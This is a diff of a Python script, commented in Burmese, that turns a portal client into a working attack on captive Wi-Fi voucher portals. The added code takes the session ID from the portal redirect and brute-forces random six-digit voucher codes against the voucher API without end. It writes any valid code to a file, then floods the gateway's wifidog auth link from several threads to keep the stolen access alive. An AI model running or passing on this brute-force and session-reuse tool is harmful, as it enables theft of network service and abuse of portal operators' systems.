@@ -1,84 +1,113 @@
 import requests
+import re
+import urllib3
+import time
+import threading
 import random
 import string
-import time
-from concurrent.futures import ThreadPoolExecutor
+from urllib.parse import urlparse, parse_qs
 
-class StarlinkMain:
-    def __init__(self):
-        self.session_id = None
-        self.base_url = "https://portal-as.ruijienetworks.com"
-        self.headers = {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
-            "Content-Type": "application/json"
-        }
+# Warning များကို ပိတ်ထားခြင်း
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-    def get_session_id(self):
-        """Portal မှ Session ID ကို ရယူခြင်း"""
-        print("[+] Getting Router Info...")
+# --- SETTINGS ---
+THREADS = 5
+PING_INTERVAL = 0.1
+TARGET_TEST_URL = "http://connectivitycheck.gstatic.com/generate_204"
+
+def check_real_internet():
+    try:
+        return requests.get("http://www.google.com", timeout=3).status_code == 200
+    except:
+        return False
+
+def generate_voucher(length=6):
+    chars = string.ascii_uppercase + string.digits
+    return ''.join(random.choice(chars) for _ in range(length))
+
+def high_speed_ping(auth_link, session, sid):
+    """အင်တာနက် အဆက်မပြတ်ရစေရန် Auth Link ကို Ping ထိုးပေးခြင်း"""
+    print(f"\n[+] Turbo Ping Started for SID: {sid}")
+    while True:
         try:
-            # ဤနေရာတွင် actual portal URL ကို အသုံးပြုရမည်
-            response = requests.get(f"{self.base_url}/api/auth/wifidog", timeout=10)
-            # Logic အတိုချုံးထားခြင်း (Regex ဖြင့် session ID ကို ရှာဖွေခြင်း)
-            self.session_id = "extracted_session_id_example" 
-            return self.session_id
-        except Exception as e:
-            print(f"Error: {e}")
-            return None
-
-    def get_random_code(self, length=6):
-        """Voucher code အဖြစ် စမ်းသပ်ရန် random code ထုတ်ပေးခြင်း"""
-        chars = string.ascii_uppercase + string.digits
-        return ''.join(random.choice(chars) for _ in range(length))
-
-    def login_voucher(self, voucher_code):
-        """Voucher code ကို အသုံးပြု၍ login စမ်းသပ်ခြင်း"""
-        login_url = f"{self.base_url}/api/auth/voucher/?lang=en_US"
-        data = {
-            "voucher": voucher_code,
-            "sessionId": self.session_id
-        }
-        try:
-            res = requests.post(login_url, json=data, headers=self.headers, timeout=5)
-            if res.status_code == 200 and "success" in res.text.lower():
-                return True, voucher_code
-            return False, voucher_code
+            session.get(auth_link, timeout=5)
+            # အင်တာနက်တကယ်ရမရ စစ်ဆေးခြင်း
+            if check_real_internet():
+                print(f"[{time.strftime('%H:%M:%S')}] Status: CONNECTED (Online)     ", end='\r')
+            else:
+                print(f"[{time.strftime('%H:%M:%S')}] Status: PINGING (Wait...)      ", end='\r')
         except:
-            return False, None
+            break
+        time.sleep(PING_INTERVAL)
 
-    def check_internet_access(self):
-        """Internet ရမရ စစ်ဆေးခြင်း"""
-        print("[+] Checking Internet Access...")
-        try:
-            requests.get("https://httpbin.org/get", timeout=5)
-            return True
-        except:
-            return False
+def start_attack():
+    print(f"[*] Starting Combined Starlink & Redirect Script...")
+    
+    session = requests.Session()
+    session.headers.update({
+        "User-Agent": "Mozilla/5.0 (Android 10; Mobile; rv:119.0) Gecko/119.0 Firefox/119.0"
+    })
 
-    def execute(self):
-        """ပင်မ လုပ်ဆောင်ချက်"""
-        print("[+] Starting...")
-        if not self.get_session_id():
-            print("[-] Failed to get session ID")
+    try:
+        # ၁။ Portal Redirect ကို ရှာဖွေပြီး Session ID (sid) နှိုက်ယူခြင်း
+        r = session.get(TARGET_TEST_URL, allow_redirects=True, timeout=5)
+        portal_url = r.url
+        parsed_portal = urlparse(portal_url)
+        portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
+        
+        # URL parameters မှ sid ကို ရှာခြင်း
+        params = parse_qs(parsed_portal.query)
+        sid = params.get('sid', [None])[0] or params.get('token', [None])[0]
+
+        if not sid:
+            # HTML content ထဲတွင် sid ပါသလား ထပ်ရှာခြင်း
+            sid_match = re.search(r'sid=(.*?)["\'&]', r.text)
+            sid = sid_match.group(1) if sid_match else None
+
+        if not sid:
+            print("[!] Error: Could not find Session ID (sid).")
             return
 
-        with ThreadPoolExecutor(max_workers=5) as executor:
-            print("[+] Bruteforcing Access Voucher Code...")
-            # ဥပမာအနေဖြင့် ၁၀ ကြိမ် စမ်းသပ်ပြခြင်း
-            for _ in range(10):
-                code = self.get_random_code()
-                future = executor.submit(self.login_voucher, code)
-                success, used_code = future.result()
+        print(f"[+] Found Session ID: {sid}")
+        print(f"[*] Target Portal: {portal_host}")
+
+        # ၂။ Brute-force Voucher Loop
+        print(f"[*] Brute-forcing Vouchers (Threads: {THREADS})...")
+        
+        found_voucher = None
+        voucher_api = f"{portal_host}/api/auth/voucher/"
+
+        while not found_voucher:
+            v_code = generate_voucher()
+            try:
+                # 'accessCode' သို့မဟုတ် 'voucher' ဟု Portal ပေါ်မူတည်၍ ပြောင်းလဲနိုင်သည်
+                v_res = session.post(voucher_api, json={'accessCode': v_code, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                 
-                if success:
-                    print(f"[1;32mSuccess Code: {used_code}")
-                    with open("success.txt", "a") as f:
-                        f.write(f"{used_code}\n")
-                    break
+                if v_res.status_code == 200 and "success" in v_res.text.lower():
+                    print(f"\n{'-'*30}\n[!] SUCCESS: {v_code} is Valid!\n{'-'*30}")
+                    found_voucher = v_code
+                    with open("found_vouchers.txt", "a") as f:
+                        f.write(f"{v_code} (SID: {sid})\n")
                 else:
-                    print(f"Testing Code: {code} - Fail")
+                    print(f"[-] Testing: {v_code} - Failed", end='\r')
+            except:
+                continue
+
+        # ၃။ အောင်မြင်သွားပါက Wifidog Auth Link တည်ဆောက်ပြီး Ping ထိုးခြင်း
+        gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
+        gw_port = params.get('gw_port', ['2060'])[0]
+        auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
+
+        # Ping လုပ်ရန် thread အသစ်ဖွင့်ခြင်း
+        for _ in range(THREADS):
+            threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()
+
+        # Script မရပ်တန့်သွားစေရန် ထိန်းထားခြင်း
+        while True:
+            time.sleep(1)
+
+    except Exception as e:
+        print(f"\n[!] Connection Error: {e}")
 
 if __name__ == "__main__":
-    app = StarlinkMain()
-    app.execute()
-    
+    start_attack()
